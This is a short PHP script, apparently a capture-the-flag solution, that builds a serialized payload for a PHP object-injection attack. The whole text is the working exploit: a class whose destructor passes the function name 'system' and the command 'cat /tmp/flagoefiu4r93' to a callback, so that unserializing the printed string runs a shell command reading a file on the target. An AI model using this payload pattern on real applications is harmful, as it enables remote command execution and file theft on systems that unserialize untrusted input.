<?php
class Test
{
    var $p = "cat /tmp/flagoefiu4r93";
    var $func = "system";

    function __destruct()
    {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$a = new Test();
echo serialize($a);
